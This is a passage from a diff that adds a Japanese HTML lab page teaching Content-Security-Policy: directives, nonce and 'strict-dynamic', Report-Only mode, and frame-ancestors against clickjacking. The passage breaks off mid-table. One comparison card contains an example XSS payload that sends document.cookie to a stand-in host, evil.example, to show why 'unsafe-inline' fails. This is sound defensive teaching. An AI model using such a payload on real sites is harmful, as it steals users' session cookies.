@@ -1,0 +1,910 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com; script-src 'self' 'nonce-lab08demo' 'strict-dynamic'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https:; connect-src 'self' https://httpbin.org; frame-ancestors 'none';">
+<title>HTTP Header Lab 08 - CSP（Content-Security-Policy）</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=Noto+Sans+JP:wght@400;700&display=swap');
+
+  :root {
+    --bg: #ffffff;
+    --surface: #f5f7fa;
+    --surface2: #ebeef2;
+    --border: #c8cdd3;
+    --text: #1a1a2e;
+    --text-dim: #5c6370;
+    --accent: #005cc5;
+    --accent2: #22863a;
+    --accent3: #6f42c1;
+    --warn: #b08800;
+    --danger: #cb2431;
+    --code-bg: #f0f4f8;
+    --radius: 10px;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Noto Sans JP', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.8;
+    padding: 2rem;
+    max-width: 1100px;
+    margin: 0 auto;
+  }
+
+  h1 { font-size: 1.6rem; color: var(--accent); border-bottom: 2px solid var(--border); padding-bottom: 0.8rem; margin-bottom: 1.5rem; font-family: 'IBM Plex Mono', monospace; }
+  h2 { font-size: 1.25rem; color: var(--accent2); margin: 2rem 0 1rem; font-family: 'IBM Plex Mono', monospace; }
+  h3 { font-size: 1.05rem; color: var(--accent3); margin: 1.5rem 0 0.8rem; }
+  p, li { font-size: 0.92rem; margin-bottom: 0.5rem; }
+
+  .status-bar { display: flex; gap: 1rem; align-items: center; background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 0.6rem 1rem; margin-bottom: 1.5rem; font-size: 0.82rem; font-family: 'IBM Plex Mono', monospace; flex-wrap: wrap; }
+  .status-item { display: flex; align-items: center; gap: 0.4rem; }
+  .status-dot { width: 10px; height: 10px; border-radius: 50%; background: var(--text-dim); animation: pulse 1.5s infinite; }
+  .status-dot.ok { background: var(--accent); animation: none; }
+  .status-dot.err { background: var(--danger); animation: none; }
+  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
+
+  .alert-critical { background: #fef2f2; border: 2px solid var(--danger); border-radius: var(--radius); padding: 1rem 1.2rem; margin-bottom: 1.5rem; font-size: 0.88rem; }
+  .alert-critical strong { color: var(--danger); }
+  .alert-critical code { background: rgba(203,36,49,0.1); color: var(--danger); }
+
+  .lab-box { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 1.5rem; margin: 1.5rem 0; }
+  .step { background: var(--surface2); border-left: 3px solid var(--accent2); border-radius: 0 var(--radius) var(--radius) 0; padding: 1rem 1.2rem; margin: 1rem 0; }
+  .step-num { font-family: 'IBM Plex Mono', monospace; color: var(--accent2); font-weight: 600; font-size: 0.8rem; margin-bottom: 0.3rem; }
+
+  code, pre { font-family: 'IBM Plex Mono', monospace; font-size: 0.82rem; }
+  code { background: var(--code-bg); padding: 0.15rem 0.4rem; border-radius: 4px; color: var(--accent); }
+  pre { background: var(--code-bg); border: 1px solid var(--border); border-radius: var(--radius); padding: 1rem; overflow-x: auto; margin: 0.8rem 0; line-height: 1.6; color: #24292e; }
+  pre .comment { color: #6a737d; }
+  pre .header-name { color: var(--accent2); }
+  pre .header-val { color: var(--accent); }
+  pre .highlight { color: var(--warn); font-weight: 600; }
+
+  .placeholder { color: var(--text-dim); font-style: italic; font-size: 0.8rem; }
+
+  .note { background: #e8f4fd; border: 1px solid #b6d4e8; border-radius: var(--radius); padding: 0.8rem 1rem; margin: 1rem 0; font-size: 0.85rem; color: var(--accent2); }
+  .note::before { content: "💡 "; }
+  .warn-box { background: #fff8e1; border: 1px solid #e6d590; border-radius: var(--radius); padding: 0.8rem 1rem; margin: 1rem 0; font-size: 0.85rem; color: var(--warn); }
+  .warn-box::before { content: "⚠️ "; }
+
+  .check-item { background: var(--surface2); border-radius: var(--radius); padding: 0.6rem 1rem; margin: 0.4rem 0; display: flex; align-items: center; gap: 0.6rem; font-size: 0.88rem; transition: opacity 0.3s; }
+  .check-item input[type="checkbox"] { width: 18px; height: 18px; accent-color: var(--accent); flex-shrink: 0; }
+  .check-item.checked { opacity: 0.55; }
+
+  .diagram { background: var(--code-bg); border: 1px solid var(--border); border-radius: var(--radius); padding: 1.2rem; font-family: 'IBM Plex Mono', monospace; font-size: 0.78rem; line-height: 1.5; overflow-x: auto; white-space: pre; color: var(--text-dim); margin: 1rem 0; }
+
+  .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin: 1rem 0; }
+  .three-col { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 0.8rem; margin: 1rem 0; }
+  @media (max-width: 900px) { .three-col { grid-template-columns: 1fr; } }
+  @media (max-width: 768px) { .two-col { grid-template-columns: 1fr; } }
+
+  .col-card { background: var(--code-bg); border: 1px solid var(--border); border-radius: var(--radius); padding: 0.8rem; font-size: 0.8rem; }
+  .col-card h4 { font-family: 'IBM Plex Mono', monospace; font-size: 0.78rem; margin-bottom: 0.5rem; padding-bottom: 0.4rem; border-bottom: 1px solid var(--border); }
+  .col-card pre { border: none; padding: 0.4rem 0; margin: 0; font-size: 0.75rem; background: transparent; }
+
+  a { color: var(--accent2); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  hr { border: none; border-top: 1px solid var(--border); margin: 2.5rem 0; }
+  html { scroll-behavior: smooth; }
+
+  .btn { border: none; padding: 0.5rem 1.2rem; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 0.85rem; font-family: 'Noto Sans JP', sans-serif; margin: 0.3rem; transition: opacity 0.2s; }
+  .btn:hover { opacity: 0.85; }
+  .btn:active { transform: scale(0.97); }
+  .btn-accent { background: var(--accent); color: var(--bg); }
+  .btn-accent2 { background: var(--accent2); color: var(--bg); }
+  .btn-accent3 { background: var(--accent3); color: var(--bg); }
+  .btn-warn { background: var(--warn); color: var(--bg); }
+  .btn-dim { background: var(--surface2); color: var(--text-dim); border: 1px solid var(--border); }
+
+  .toc { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 1rem 1.2rem; margin: 1rem 0 2rem; }
+  .toc a { display: inline-block; padding: 0.25rem 0.6rem; margin: 0.15rem; border-radius: 6px; font-size: 0.82rem; background: var(--surface2); transition: background 0.2s; }
+  .toc a:hover { background: var(--border); text-decoration: none; }
+
+  /* CSP comparison table */
+  .csp-table { width: 100%; border-collapse: collapse; margin: 1rem 0; font-size: 0.82rem; }
+  .csp-table th { background: var(--surface2); color: var(--accent2); font-family: 'IBM Plex Mono', monospace; padding: 0.5rem 0.8rem; text-align: left; border: 1px solid var(--border); }
+  .csp-table td { padding: 0.5rem 0.8rem; border: 1px solid var(--border); vertical-align: top; font-size: 0.8rem; }
+  .csp-table tr:nth-child(even) td { background: rgba(255,255,255,0.02); }
+  .tag-ok { color: var(--accent); font-weight: 600; }
+  .tag-ng { color: var(--danger); font-weight: 600; }
+  .tag-warn { color: var(--warn); font-weight: 600; }
+</style>
+</head>
+<body>
+
+<!-- STATUS BAR -->
+<div class="status-bar">
+  <div class="status-item">
+    <div class="status-dot" id="dot-protocol"></div>
+    <span id="status-protocol">プロトコル確認中...</span>
+  </div>
+  <div class="status-item">
+    <div class="status-dot" id="dot-csp"></div>
+    <span id="status-csp">CSP metaタグ確認中...</span>
+  </div>
+  <div class="status-item">
+    <div class="status-dot" id="dot-devtools"></div>
+    <span>DevTools: <kbd style="background:var(--surface2);padding:0.1rem 0.4rem;border-radius:4px;">F12</kbd></span>
+  </div>
+</div>
+<p style="margin-bottom:0.5rem;font-size:0.82rem;"><a href="http-header-lab-index.html" style="color:var(--accent);text-decoration:none;">← マスター索引に戻る</a></p>
+
+<script nonce="lab08demo">
+(function() {
+  var dot = document.getElementById('dot-protocol');
+  var label = document.getElementById('status-protocol');
+  if (location.protocol === 'file:') {
+    dot.classList.add('err');
+    label.innerHTML = '<strong style="color:var(--danger)">file:// 検出（要修正）</strong>';
+    document.getElementById('file-protocol-alert').style.display = 'block';
+  } else {
+    dot.classList.add('ok');
+    label.textContent = location.protocol + '// ✅';
+  }
+})();
+(function() {
+  var dot = document.getElementById('dot-csp');
+  var label = document.getElementById('status-csp');
+  var metaCSP = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
+  if (metaCSP && metaCSP.content) {
+    dot.classList.add('ok');
+    label.textContent = 'CSP metaタグ設定済み ✅';
+  } else {
+    dot.classList.add('err');
+    label.innerHTML = '<strong style="color:var(--danger)">CSP metaタグ未検出</strong>';
+  }
+})();
+</script>
+
+<div class="alert-critical" id="file-protocol-alert" style="display:none;">
+  <strong>🔴 HTTP サーバー経由で開いてください</strong><br><br>
+  現在 <code>file://</code> で開いています。この状態では <code>fetch()</code> が
+  <strong>CORSエラー</strong>になり、ほとんどの実験が動作しません。<br><br>
+  <strong>Lab 01 で起動したサーバーがまだ動いていれば</strong>、ブラウザで
+  <code>http://127.0.0.1:7890/http-header-lab-08.html</code> を開くだけでOKです。<br><br>
+  サーバーが停止している場合は、コマンドプロンプトで以下を実行してください：
+  <pre style="margin:0.8rem 0; font-size:0.78rem;"><span class="highlight">node -e "const http=require('http'),fs=require('fs'),path=require('path');http.createServer((req,res)=>{const f=path.join('C:/Users/user/ClaudeCode/HTTPHeader',req.url==='/'?'/index.html':req.url);fs.readFile(f,(e,d)=>{if(e){res.writeHead(404);res.end('Not found');}else{const ext=path.extname(f);const mime={'html':'text/html','js':'application/javascript','css':'text/css','png':'image/png','ico':'image/x-icon'};res.writeHead(200,{'Content-Type':(mime[ext.slice(1)]||'text/plain')+';charset=utf-8'});res.end(d);}});}).listen(7890,()=>console.log('Server: http://127.0.0.1:7890'));"</span>
+
+<span class="comment"># → http://127.0.0.1:7890/http-header-lab-08.html でアクセス</span></pre>
+</div>
+
+<h1>🧪 Lab 08: CSP（Content-Security-Policy）</h1>
+<p style="font-size:0.72rem;color:var(--text-dim);margin-bottom:0.3rem;font-family:'IBM Plex Mono',monospace;">最終更新: 2026年3月</p>
+<p style="color:var(--text-dim); font-size:0.88rem; margin-bottom:1rem;">
+  ～ XSS防御の要、nonce方式、Report-Only、frame-ancestors を理解する ～
+</p>
+<div style="display:flex;gap:1rem;flex-wrap:wrap;margin-bottom:1rem;">
+  <span style="background:var(--surface2);padding:0.3rem 0.8rem;border-radius:6px;font-size:0.8rem;font-family:'IBM Plex Mono',monospace;">⏱ 所要時間：35分</span>
+  <span style="background:var(--surface2);padding:0.3rem 0.8rem;border-radius:6px;font-size:0.8rem;font-family:'IBM Plex Mono',monospace;">難易度：★★★</span>
+</div>
+<p style="font-size:0.82rem;color:var(--text-dim);margin-bottom:1rem;">📋 前提知識：<a href="http-header-lab-06.html">Lab 06</a> 完了推奨（CORS の Origin 概念を理解していると CSP の理解が深まる）</p>
+
+<div class="lab-box" style="border-color:var(--accent); margin-bottom:1rem;">
+  <h3 style="color:var(--accent); margin-top:0;">🎯 このLabの学習目標</h3>
+  <p style="margin-bottom:0.3rem;">完了すると、以下ができるようになります：</p>
+  <div class="check-item" style="opacity:1;"><span>1. CSP の基本ディレクティブ（<code>default-src</code>, <code>script-src</code>, <code>style-src</code>, <code>img-src</code>）を理解する</span></div>
+  <div class="check-item" style="opacity:1;"><span>2. <code>'unsafe-inline'</code> を使わず <code>nonce</code> + <code>'strict-dynamic'</code> 方式を選ぶ理由を説明できる</span></div>
+  <div class="check-item" style="opacity:1;"><span>3. <code>Content-Security-Policy-Report-Only</code> で違反を本番ブロックせずに検出できる</span></div>
+  <div class="check-item" style="opacity:1;"><span>4. <code>frame-ancestors 'none'</code> でクリックジャッキングを防止できる</span></div>
+  <div class="check-item" style="opacity:1;"><span>5. DevTools の Console タブで CSP 違反ログを確認できる</span></div>
+</div>
+<div class="warn-box" style="border-color:var(--accent3);background:#fce4ec;">
+  <strong style="color:var(--accent3);">💥 実務での失敗例</strong>：CSPに <code>'unsafe-inline'</code> を設定したままXSS脆弱性が発見され、攻撃者のスクリプトがそのまま実行された。nonce方式なら防げた
+</div>
+
+<div class="toc">
+  <strong style="color:var(--text-dim);font-size:0.82rem;">目次:</strong><br>
+  <a href="#concept">概念整理</a>
+  <a href="#exp-8a">8-A: CSP基本ディレクティブ</a>
+  <a href="#exp-8b">8-B: nonce方式 vs unsafe-inline</a>
+  <a href="#exp-8c">8-C: Report-Onlyモード</a>
+  <a href="#exp-8d">8-D: frame-ancestors（クリックジャッキング防止）</a>
+  <a href="#exp-8e">8-E: DevToolsで違反を確認</a>
+  <a href="#checklist">✅ チェックリスト</a>
+  <a href="#framework">🔧 設定例</a>
+</div>
+
+<!-- ── 概念整理 ── -->
+<div class="lab-box" id="concept">
+  <h3>CSP ディレクティブの全体像</h3>
+
+  <div class="diagram">CSP ディレクティブの優先順位:
+
+  Content-Security-Policy:
+    default-src 'self';          ← デフォルト（全リソース種別に適用）
+    script-src 'nonce-abc123'    ← スクリプトだけ個別指定（defaultより優先）
+              'strict-dynamic';  ← nonceで許可したスクリプトの動的ロードも許可
+    style-src 'self';
+    img-src 'self' data: https:;
+    connect-src 'self' https://api.example.com;
+    frame-ancestors 'none';      ← iframe埋め込みをすべて禁止
+    base-uri 'self';
+    require-trusted-types-for 'script';
+
+  ❌ 危険:   script-src 'unsafe-inline'  → XSS攻撃がそのまま実行される
+  ✅ 推奨:   script-src 'nonce-{乱数}' 'strict-dynamic'</div>
+
+  <div class="two-col">
+    <div class="col-card">
+      <h4 style="color:var(--accent);">主要ディレクティブ一覧</h4>
+      <pre>default-src   全リソース種別のデフォルト
+script-src    JavaScriptの読み込み元
+style-src     CSSの読み込み元
+img-src       画像の読み込み元
+font-src      フォントの読み込み元
+connect-src   fetch/XHRの接続先
+frame-src     iframeの埋め込み元
+frame-ancestors  自分自身をiframeで
+             埋め込める親を制限</pre>
+    </div>
+    <div class="col-card">
+      <h4 style="color:var(--accent2);">ソースキーワード</h4>
+      <pre>'self'          同一オリジンのみ許可
+'none'          すべて禁止
+'unsafe-inline' インラインを許可（危険）
+'unsafe-eval'   eval()を許可（危険）
+'nonce-xxx'     nonce属性が一致するのみ
+'strict-dynamic' nonceスクリプトの動的
+                ロードも許可
+https:          全HTTPSオリジン許可
+data:           data: URIを許可</pre>
+    </div>
+  </div>
+
+  <div class="note">
+    <strong>CSPはHTTPレスポンスヘッダーまたはmetaタグで設定</strong>:
+    このページはmetaタグでCSPを設定しています（<code>&lt;meta http-equiv="Content-Security-Policy" ...&gt;</code>）。
+    本番環境ではレスポンスヘッダーで設定するのが推奨です。
+    <strong>metaタグではframe-ancestorsは機能しない</strong>ためご注意ください（ヘッダー設定が必要）。
+  </div>
+</div>
+
+<!-- ── 実験 8-A ── -->
+<div class="lab-box" id="exp-8a">
+  <h3>実験 8-A: CSP基本ディレクティブの確認</h3>
+  <p>このページ自体にCSPが設定されています。metaタグの内容を確認し、各ディレクティブの役割を理解します。</p>
+
+  <div class="step">
+    <div class="step-num">STEP 1 — このページのCSP metaタグを確認</div>
+    <p>ボタンを押すと、このページのCSP設定をJavaScriptで読み取って表示します。</p>
+    <button class="btn btn-accent" id="btn-check-csp">このページのCSP metaタグを確認</button>
+    <pre id="csp-meta-result"><span class="placeholder">← ボタンを押すと結果が表示されます</span></pre>
+  </div>
+
+  <div class="step">
+    <div class="step-num">STEP 2 — fetch でhttpbin.orgのレスポンスヘッダーを確認（CSPがAPIをブロックするか）</div>
+    <p>
+      このページのCSPには <code>connect-src 'self' https://httpbin.org</code> が含まれています。
+      httpbin.org への fetch は <strong>許可されている</strong>はずです。
+    </p>
+    <button class="btn btn-accent2" id="btn-fetch-httpbin">fetch でhttpbin.orgのレスポンスヘッダーを確認</button>
+    <pre id="fetch-httpbin-result"><span class="placeholder">← ボタンを押すと結果が表示されます</span></pre>
+  </div>
+
+  <h3 style="margin-top:1.5rem;">許可ソース vs ブロックソース（このページの設定）</h3>
+  <div class="two-col">
+    <div class="col-card">
+      <h4 style="color:var(--accent);">✅ 許可されているリソース</h4>
+      <pre>スクリプト:
+  nonce="lab08demo" のインラインスクリプト
+  'strict-dynamic' による動的ロード
+
+スタイル:
+  インラインスタイル（unsafe-inline）
+  fonts.googleapis.com
+
+画像:
+  同一オリジン（self）
+  data: URI
+  全HTTPSオリジン（https:）
+
+通信（fetch/XHR）:
+  同一オリジン（self）
+  https://httpbin.org</pre>
+    </div>
+    <div class="col-card">
+      <h4 style="color:var(--danger);">❌ ブロックされるリソース</h4>
+      <pre>スクリプト:
+  nonce なしのインラインスクリプト
+  eval() 実行
+  不明な外部ドメインのJS
+
+スタイル:
+  不明な外部ドメインのCSS
+
+通信（fetch/XHR）:
+  httpbin.org 以外の外部API
+  例: api.twitter.com など
+
+iframeとして埋め込まれること:
+  frame-ancestors 'none'
+  このページはiframe不可</pre>
+    </div>
+  </div>
+</div>
+
+<script nonce="lab08demo">
+document.getElementById('btn-check-csp').addEventListener('click', function() {
+  var el = document.getElementById('csp-meta-result');
+  var metaCSP = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
+  if (!metaCSP) {
+    el.textContent = 'CSP metaタグが見つかりません。';
+    return;
+  }
+  var content = metaCSP.content;
+  var directives = content.split(';').map(function(d) { return d.trim(); }).filter(Boolean);
+  var output = 'CSP metaタグの内容:\n\n';
+  directives.forEach(function(d) {
+    output += '  ' + d + ';\n';
+  });
+  output += '\nディレクティブ数: ' + directives.length + '\n\n';
+  output += '各ディレクティブの役割:\n';
+  directives.forEach(function(d) {
+    var parts = d.split(/\s+/);
+    var name = parts[0];
+    var desc = {
+      'default-src': '→ 全リソース種別のデフォルトポリシー',
+      'script-src': '→ JavaScriptの読み込み元を制限',
+      'style-src': '→ CSSの読み込み元を制限',
+      'img-src': '→ 画像の読み込み元を制限',
+      'connect-src': '→ fetch/XHRの接続先を制限',
+      'frame-ancestors': '→ このページをiframe埋め込みできる親を制限'
+    };
+    if (desc[name]) output += '  ' + name + ' ' + desc[name] + '\n';
+  });
+  el.textContent = output;
+});
+
+document.getElementById('btn-fetch-httpbin').addEventListener('click', async function() {
+  var el = document.getElementById('fetch-httpbin-result');
+  el.textContent = '送信中...';
+  try {
+    var c = new AbortController();
+    var t = setTimeout(function() { c.abort(); }, 8000);
+    var res = await fetch('https://httpbin.org/get', { signal: c.signal });
+    clearTimeout(t);
+    var data = await res.json();
+    var output = 'CSP の connect-src により httpbin.org への接続が許可されました ✅\n\n';
+    output += 'ステータス: ' + res.status + ' ' + res.statusText + '\n\n';
+    output += 'レスポンスの一部（httpbin.org が返したリクエスト情報）:\n';
+    output += '  origin: ' + (data.origin || '不明') + '\n';
+    output += '  url: ' + (data.url || '不明') + '\n\n';
+    output += 'CSP の connect-src に https://httpbin.org が含まれているため接続可能。\n';
+    output += 'もし connect-src から除外されていたら、このfetchはCSPでブロックされます。';
+    el.textContent = output;
+  } catch(e) {
+    el.textContent = 'エラー: ' + e.message + '\n\n'
+      + '※ file:// で開いている場合はCORSエラーが発生します。\n'
+      + '  HTTP サーバー経由（http://127.0.0.1:7890/）で開いてください。';
+  }
+});
+</script>
+
+<!-- ── 実験 8-B ── -->
+<div class="lab-box" id="exp-8b">
+  <h3>実験 8-B: nonce方式 vs unsafe-inline</h3>
+  <p>なぜ <code>'unsafe-inline'</code> が危険で、<code>nonce</code> + <code>'strict-dynamic'</code> が推奨されるのかを理解します。</p>
+
+  <div class="two-col">
+    <div class="col-card">
+      <h4 style="color:var(--danger);">❌ unsafe-inline（危険）</h4>
+      <pre style="background:rgba(203,36,49,0.05);">CSP: script-src 'unsafe-inline'
+
+→ 正規のスクリプト:
+  &lt;script&gt;initApp();&lt;/script&gt; ✅ 実行
+
+→ XSS攻撃（例: コメント欄等から注入）:
+  &lt;script&gt;
+    document.location='https://evil.example/'
+      +'?c='+document.cookie
+  &lt;/script&gt; ← これも実行される！ 🔴
+
+'unsafe-inline' は全インラインスクリプトを
+許可するため、XSS攻撃も防げない</pre>
+    </div>
+    <div class="col-card">
+      <h4 style="color:var(--accent);">✅ nonce方式（安全）</h4>
+      <pre style="background:rgba(110,231,183,0.05);">CSP: script-src 'nonce-r4nd0m123'
+           'strict-dynamic'
+
+→ nonce付きスクリプト（サーバーが生成）:
+  &lt;script nonce="r4nd0m123"&gt;
+    initApp();
+  &lt;/script&gt; ✅ 実行される
+
+→ XSS攻撃（nonceなし）:
+  &lt;script&gt;
+    document.location='https://evil.example/'
+  &lt;/script&gt; ← ブロック！ ✅
+
+nonceは毎リクエストごとに乱数生成（サーバー側）
+攻撃者はnonceを予測できない</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">STEP 1 — このページのnonce値を確認</div>
+    <p>このページの <code>&lt;script&gt;</code> タグの <code>nonce</code> 属性を確認します。</p>
+    <button class="btn btn-accent" id="btn-check-nonce">このページのscriptタグのnonce属性を確認</button>
+    <pre id="nonce-result"><span class="placeholder">← ボタンを押すと結果が表示されます</span></pre>
+  </div>
+
+  <div class="step">
+    <div class="step-num">STEP 2 — strict-dynamic の役割を理解する</div>
+    <pre><span class="header-name">'strict-dynamic'</span> とは:
+
+nonceで許可されたスクリプトが動的に追加する
+スクリプトも自動的に許可する仕組み。
+
+<span class="comment">// 例: nonce付きスクリプトから動的に外部JSをロード</span>
+<span class="header-val">&lt;script nonce="r4nd0m123"&gt;</span>
+  const s = document.createElement('script');
+  s.src = 'https://cdn.example.com/lib.js';
+  document.head.appendChild(s);
+  <span class="comment">// → 'strict-dynamic' があれば許可される！</span>
+  <span class="comment">// → なければ script-src に cdn.example.com を列挙必要</span>
+<span class="header-val">&lt;/script&gt;</span>
+
+<span class="highlight">メリット: CDN URLをCSPに列挙する必要がなく管理が楽</span>
+<span class="comment">// ただし: script-src に URL ホワイトリストがある場合、</span>
+<span class="comment">// 'strict-dynamic' はそのホワイトリストを無視する</span></pre>
+  </div>
+
+  <div class="note">
+    <strong>本番環境でのnonce生成</strong>:
+    nonceはリクエストごとにサーバーサイドで乱数生成します。
+    Node.js の例: <code>crypto.randomBytes(16).toString('base64')</code>
+    同じnonceを使い回すと攻撃者に予測される可能性があります。
+    このページはデモ用に固定値 <code>lab08demo</code> を使用していますが、
+    本番では必ずランダム値を使用してください。
+  </div>
+</div>
+
+<script nonce="lab08demo">
+document.getElementById('btn-check-nonce').addEventListener('click', function() {
+  var el = document.getElementById('nonce-result');
+  var scripts = document.querySelectorAll('script');
+  var output = 'このページの script タグ一覧:\n\n';
+  var nonceCount = 0;
+  var noNonceCount = 0;
+  scripts.forEach(function(s, i) {
+    var nonce = s.getAttribute('nonce');
+    var src = s.src ? '(外部: ' + s.src.substring(0, 60) + ')' : '(インライン)';
+    if (nonce) {
+      output += '  [' + i + '] nonce="' + nonce + '" ' + src + ' ✅\n';
+      nonceCount++;
+    } else if (!s.src) {
+      output += '  [' + i + '] nonce なし ' + src + '\n';
+      noNonceCount++;
+    } else {
+      output += '  [' + i + '] 外部スクリプト: ' + src + '\n';
+    }
+  });
+  output += '\n合計: ' + scripts.length + ' 個のscriptタグ\n';
+  output += 'nonce付き: ' + nonceCount + ' 個\n';
+  output += '\nCSP: script-src \'nonce-lab08demo\' \'strict-dynamic\'\n';
+  output += '→ nonce="lab08demo" のスクリプトのみ実行が許可されています\n';
+  output += '→ 本番環境ではnonceはリクエストごとに乱数生成してください';
+  el.textContent = output;
+});
+</script>
+
+<div class="note" style="border-color:var(--accent);background:#e8f5e9;">
+  ✅ <strong style="color:var(--accent);">nonce 導入のベストプラクティス</strong>
+  <ol style="font-size:0.85rem;margin-top:0.5rem;padding-left:1.2rem;">
+    <li><strong>サーバー側で毎リクエストごとに乱数を生成</strong>（暗号論的安全な乱数: <code>crypto.randomBytes(16).toString('base64')</code>）</li>
+    <li><strong>Report-Only モードで段階導入</strong>：まず <code>Content-Security-Policy-Report-Only</code> で違反を収集し、影響範囲を把握してから本番適用</li>
+    <li><strong><code>'strict-dynamic'</code> を併用</strong>：nonce で許可したスクリプトが動的に追加するスクリプトも自動許可される → CDN URL の列挙が不要</li>
+    <li><strong><code>require-trusted-types-for 'script'</code></strong>：DOM-based XSS の防御層を追加（CSP Level 3）</li>
+  </ol>
+</div>
+
+<!-- ── 実験 8-C ── -->
+<div class="lab-box" id="exp-8c">
+  <h3>実験 8-C: Report-Only モード</h3>
+  <p>
+    <code>Content-Security-Policy-Report-Only</code> は、CSPを本番適用する前のテストに使うヘッダーです。
+    違反があってもリソースのブロックは行わず、Console にログを出力するだけです。
+  </p>
+
+  <div class="diagram">Report-Only の導入フロー:
+
+  ステップ1: Report-Only で収集開始（本番に影響なし）
+  ─────────────────────────────────────────────────
+  Content-Security-Policy-Report-Only: default-src 'self'; report-to csp-endpoint
+  Reporting-Endpoints: csp-endpoint="https://example.com/csp-report"
+
+  → ブラウザは違反を検出してもブロックしない
+  → 違反レポートを https://example.com/csp-report に送信
+  → Console にも違反ログが表示される
+
+  ステップ2: 違反が 0 になったら本番適用
+  ─────────────────────────────────────────────────
+  Content-Security-Policy: default-src 'self'; report-to csp-endpoint
+
+  → 違反が検出されるとリソースをブロック
+  → ユーザーへの影響が出る前に十分テスト済み</div>
+
+  <div class="step">
+    <div class="step-num">STEP 1 — CSP 違反レポートの JSON 構造を確認</div>
+    <p>ブラウザがサーバーに送信するCSP違反レポートのJSON構造を確認します。</p>
+    <button class="btn btn-accent2" id="btn-show-report">Consoleにダミーの違反ログを表示する（説明用）</button>
+    <pre id="report-result"><span class="placeholder">← ボタンを押すと違反レポートのサンプルが表示されます</span></pre>
+  </div>
+
+  <div class="step">
+    <div class="step-num">STEP 2 — 違反レポートの JSON 構造</div>
+    <pre><span class="comment">// ブラウザが csp-report エンドポイントに送信するJSON（サンプル）:</span>
+{
+  <span class="header-name">"csp-report"</span>: {
+    <span class="header-name">"document-uri"</span>: <span class="header-val">"https://example.com/page.html"</span>,
+    <span class="header-name">"violated-directive"</span>: <span class="header-val">"script-src"</span>,
+    <span class="header-name">"effective-directive"</span>: <span class="header-val">"script-src-elem"</span>,
+    <span class="header-name">"original-policy"</span>: <span class="header-val">"default-src 'self'; script-src 'nonce-abc'"</span>,
+    <span class="header-name">"blocked-uri"</span>: <span class="header-val">"inline"</span>,
+    <span class="header-name">"status-code"</span>: <span class="header-val">200</span>,
+    <span class="header-name">"line-number"</span>: <span class="header-val">42</span>,
+    <span class="header-name">"source-file"</span>: <span class="header-val">"https://example.com/page.html"</span>
+  }
+}
+
+<span class="comment">// Reporting API（新仕様）では Content-Type: application/reports+json</span>
+<span class="comment">// Reporting-Endpoints: csp-endpoint="https://example.com/report"</span></pre>
+  </div>
+
+  <div class="warn-box">
+    <strong>Report-Only の注意点</strong>:
+    <code>Content-Security-Policy-Report-Only</code> と <code>Content-Security-Policy</code> は
+    同時に使用できます。Reportのみのヘッダーで新しいポリシーをテストしながら、
+    既存のポリシーは適用し続けることが可能です。
+    ただし、Report-OnlyはHTTPレスポンスヘッダーとしてのみ有効で、
+    <strong>metaタグでは機能しません</strong>。
+  </div>
+</div>
+
+<script nonce="lab08demo">
+document.getElementById('btn-show-report').addEventListener('click', function() {
+  var el = document.getElementById('report-result');
+
+  var sampleReport = {
+    "csp-report": {
+      "document-uri": window.location.href,
+      "violated-directive": "script-src-elem",
+      "effective-directive": "script-src-elem",
+      "original-policy": "default-src 'self'; script-src 'nonce-lab08demo' 'strict-dynamic'",
+      "blocked-uri": "inline",
+      "status-code": 200,
+      "line-number": 99,
+      "source-file": window.location.href
+    }
+  };
+
+  console.warn('[CSP Report-Only ダミーログ] 以下は説明用のサンプルです:');
+  console.warn('違反ディレクティブ: script-src-elem');
+  console.warn('ブロックされたリソース: inline (nonceなしのインラインスクリプト)');
+  console.warn('レポート本文:', sampleReport);
+
+  var output = 'Console にダミーログを出力しました（F12で確認）。\n\n';
+  output += 'Content-Security-Policy-Report-Only の動作:\n\n';
+  output += '  1. ブラウザが違反を検出する\n';
+  output += '  2. リソースはブロックしない（通常通り実行される）\n';
+  output += '  3. Console に違反ログを表示\n';
+  output += '  4. report-to エンドポイントに JSON を POST\n\n';
+  output += 'サンプル違反レポート:\n';
+  output += JSON.stringify(sampleReport, null, 2);
+  el.textContent = output;
+});
+</script>
+
+<!-- ── 実験 8-D ── -->
+<div class="lab-box" id="exp-8d">
+  <h3>実験 8-D: frame-ancestors（クリックジャッキング防止）</h3>
+  <p>
+    クリックジャッキング攻撃は、悪意のあるサイトが <code>iframe</code> でターゲットサイトを透明に表示し、
+    ユーザーに意図せずクリックさせる攻撃です。<code>frame-ancestors</code> でこれを防止できます。
+  </p>
+
+  <div class="diagram">クリックジャッキング攻撃の仕組み:
+
+  攻撃者のサイト（evil.example.com）
+  ┌─────────────────────────────────────┐
+  │  "ここをクリックして景品をゲット！"  ← ユーザーに見えるボタン
+  │  ┌──────────────────────────────┐   │
+  │  │ 銀行サイト（透明iframe）     │   │
+  │  │ [送金実行] ← 本当のボタン    │   │
+  │  └──────────────────────────────┘   │
+  └─────────────────────────────────────┘
+  → ユーザーは景品ボタンをクリックしているつもりが
+    実際は銀行の「送金実行」を押している！
+
+  対策: frame-ancestors 'none' で iframe 埋め込みを禁止</div>
+
+  <h3 style="margin-top:1.5rem;">X-Frame-Options vs CSP frame-ancestors</h3>
+  <table class="csp-table">
+    <thead>
+      <tr>
+        <th></th>
+        <th>X-Frame-Options</th>
+        <th>CSP frame-ancestors</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>設定例</strong></td>
